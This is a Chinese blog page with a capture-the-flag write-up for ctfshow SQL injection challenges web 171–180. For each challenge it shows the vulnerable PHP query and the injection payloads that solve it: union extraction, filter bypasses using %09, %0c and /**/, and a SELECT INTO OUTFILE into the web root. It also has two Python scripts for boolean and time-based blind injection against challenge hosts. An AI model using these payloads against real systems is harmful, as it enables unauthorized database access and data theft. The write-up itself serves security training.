



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="不积跬步，无以至千里；不积小流，无以成江海。——荀子" href="https://siriu0s.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="不积跬步，无以至千里；不积小流，无以成江海。——荀子" href="https://siriu0s.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="不积跬步，无以至千里；不积小流，无以成江海。——荀子" href="https://siriu0s.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="https://siriu0s.github.io/2022/05/06/ctfshow-SQL%E6%B3%A8%E5%85%A5/">



  <title>
ctfshow SQL注入 |
Sirius's blog = 不积跬步，无以至千里；不积小流，无以成江海。——荀子 = Nothing is impossible for a willing heart.</title>
<meta name="generator" content="Hexo 6.1.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">ctfshow SQL注入
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-05-06 15:33:04">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-05-06T15:33:04+08:00">2022-05-06</time>
  </span>
  <span class="item" title="Symbols count in article">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">Symbols count in article</span>
    <span>35k</span>
    <span class="text">words</span>
  </span>
  <span class="item" title="Reading time">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">Reading time</span>
    <span>32 mins.</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Sirius's blog</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeuibk9fj20zk0m8ay2.jpg"></li>
          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeyonbf9j20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="https://siriu0s.github.io/2022/05/06/ctfshow-SQL%E6%B3%A8%E5%85%A5/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="Sirius">
    <meta itemprop="description" content="Nothing is impossible for a willing heart., ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="不积跬步，无以至千里；不积小流，无以成江海。——荀子">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h4 id="web-171-sql开始"><a class="anchor" href="#web-171-sql开始">#</a> web 171-sql 开始</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">法一：
1' or 1=1--+
法二：

1' union select 1,2,3--+
1' union select 1,2,table_name from information_schema.tables where table_schema=database()--+
1' union select 1,2,column_name from information_schema.columns where table_name='ctfshow_user'--+
1' union select 1,2,password from ctfshow_user--+
</code></pre>
<h4 id="web-172-无过滤注入2"><a class="anchor" href="#web-172-无过滤注入2">#</a> web 172 无过滤注入 2</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from ctfshow_user2 where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>      返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">1' union select 1,hex(password) from ctfshow_user2 where username = 'flag';--+
</code></pre>
<h4 id="web-173-无过滤注入3"><a class="anchor" href="#web-173-无过滤注入3">#</a> web 173 无过滤注入 3</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user3 where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">1' union select 1,2,hex(password) from ctfshow_user3 where username = 'flag';--+
</code></pre>
<h4 id="web-174-无过滤注入4-盲注"><a class="anchor" href="#web-174-无过滤注入4-盲注">#</a> web 174 无过滤注入 4 盲注</h4>
<pre><code class="language-xml-dtd">2、limit子句用于限制查询结果返回的数量。
用法：【select * from tableName limit i,n 】
参数：
tableName : 为数据表；
i : 为查询结果的索引值（默认从0开始）；
n : 为查询结果返回的数量
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from ctfshow_user4 where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>      </pre></td></tr><tr><td data-num="6"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>测试结果</p>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152506297.png" alt="image-20220506152506297" /></p>
<p>payload</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web174_盲注.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/5/4 17:10 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://75ea3a2f-510f-41a2-9089-a595b5757ea0.challenge.ctf.show/api/v4.php?id="</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>result <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="13"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">127</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"1' and if(ascii(substr((select  password from ctfshow_user4 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,1,0) --+"</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="web-175-无过滤注入5-时间盲注"><a class="anchor" href="#web-175-无过滤注入5-时间盲注">#</a> web 175 无过滤注入 5 时间盲注</h4>
<pre><code class="language-xml-dtd">[\x00-\x7f]
过滤英文字符,大小写字母,数字
select into outfile
SELECT INTO…OUTFILE语句把表数据导出到一个文本文件中，并用LOAD DATA …INFILE语句恢复数据。但是这种方法只能导出或导入数据的内容，不包括表的结构，如果表的结构文件损坏，则必须先恢复原来的表的结构。
(1)有完整路径目录且必须有读写权限777
(2)文件名必须唯一
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select username,password from ctfshow_user5 where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>测试语句。无回显，时间盲注。</p>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152530335.png" alt="image-20220506152530335" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://b9419ea8-a799-40f5-bbde-ee74003ceead.challenge.ctf.show/api/v5.php?id="</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">127</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> tail <span class="token operator">></span> head<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"1' and if(ascii(substr((select  password from ctfshow_user5 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.5),0) --+"</span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span>timeout <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">#1' and if(ascii(substr((select  password from ctfshow_user5 limit 24,1),1,1))>88,sleep(1),0) --+</span></pre></td></tr></table></figure><pre><code class="language-xml-dtd">-1' union select 1,group_concat(password) from ctfshow_user5 into outfile '/var/www/html/flag.txt' --+
</code></pre>
<h4 id="web-176-过滤注入-大写绕过"><a class="anchor" href="#web-176-过滤注入-大写绕过">#</a> web 176 过滤注入 大写绕过</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">法一：
1' or 1=1;--+
法二：
1' union SELECT id,username,password from ctfshow_user where username ='flag'--+
</code></pre>
<h4 id="web-177-过滤注入-空格过滤"><a class="anchor" href="#web-177-过滤注入-空格过滤">#</a> web 177 过滤注入 空格过滤</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>bypass</p>
<pre><code class="language-xml-dtd">绕过空格
%0a %0b %0c %0d %09 注释/**/ () ·· 
绕过注释符
#   --+    -- -   %23   --%0c 
</code></pre>
<p>payload</p>
<pre><code class="language-xml-dtd">1'/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/='flag'%23
</code></pre>
<h4 id="web-178-过滤注入-注释符过滤"><a class="anchor" href="#web-178-过滤注入-注释符过滤">#</a> web 178 过滤注入 注释符过滤</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code class="language-xml-dtd">法一：
1'%09or%091=1%09;%23
法二：
-1'%09union%09select%09password,2,3%09from%09ctfshow_user%23
</code></pre>
<h4 id="web-179-过滤注入-空格过滤2"><a class="anchor" href="#web-179-过滤注入-空格过滤2">#</a> web 179 过滤注入 空格过滤 2</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">法一：
1'%0cor%0c1=1%0c;%23
法二：
-1'%0cunion%0cselect%0cpassword,2,3%0cfrom%0cctfshow_user%23
法三：
1'or'1'='1'%23
</code></pre>
<h4 id="web-180-过滤注入-运算级andor"><a class="anchor" href="#web-180-过滤注入-运算级andor">#</a> web 180 过滤注入 运算级 and&gt;or</h4>
<pre><code class="language-xml-dtd">AND和OR运算符
作用：用于基于一个以上的条件对记录进行过滤
用法：可在WHERE子句中把两个或多个条件结合在一起。
AND：如果第一个条件和第二个条件都成立，才会显示一条记录
OR：如果第一个条件和第二个条件中只要有一个成立，则OR运算符就会显示一条记录
如果两个条件都成立，则显示两条记录
MySQL中，AND的执行优先级高于OR。也就是说，在没有小括号()的干预下，总是先执行AND语句，再执行OR语句。
</code></pre>
